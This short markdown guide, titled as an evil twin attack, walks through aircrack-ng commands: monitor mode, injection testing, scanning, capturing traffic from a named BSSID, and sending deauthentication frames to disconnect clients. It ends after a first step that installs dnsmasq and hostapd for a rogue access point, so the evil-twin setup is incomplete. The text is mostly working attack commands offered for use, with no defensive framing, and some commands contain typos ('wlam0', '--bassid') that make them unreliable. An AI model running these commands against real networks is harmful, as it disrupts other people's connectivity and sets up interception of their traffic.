# Advance Evil twin attack!!

<h3> Put wireless card in monitor mode </h3>

```bash
airmon-ng start wlam0
```
 
  ### Testing the packet injection 
  
  ```bash
  aireplay-ng --test wlan0mon
  ```
  ### sniffing wireless network
   #### Scanning all the networks avalible
  
  ```bash
  airodump-ng wlan0mon
  ```
  ### sniff packs 
  
  ```bash
  airodump-ng --bassid 04:B0:E7:EC:34:24 -c 6 -w capture wlan0mon
  # this will start capturing packs in folder called capture
  ```
  
  ### inject packets in target network 
  ```bash
  aireplay-ng --deauth 10 -a 04:B0:E7:EC:34:24 wlan0mon
  ```
  ### To see the packets captured
  ```bash
  wireshark capture.cap
  ```
  
  # Setp 1
  
  - Install dnsmasq hostapd
  
   ```bash
        apt install dnsmasq hostapd
        ```
        
  
  
  
  
  
  
  
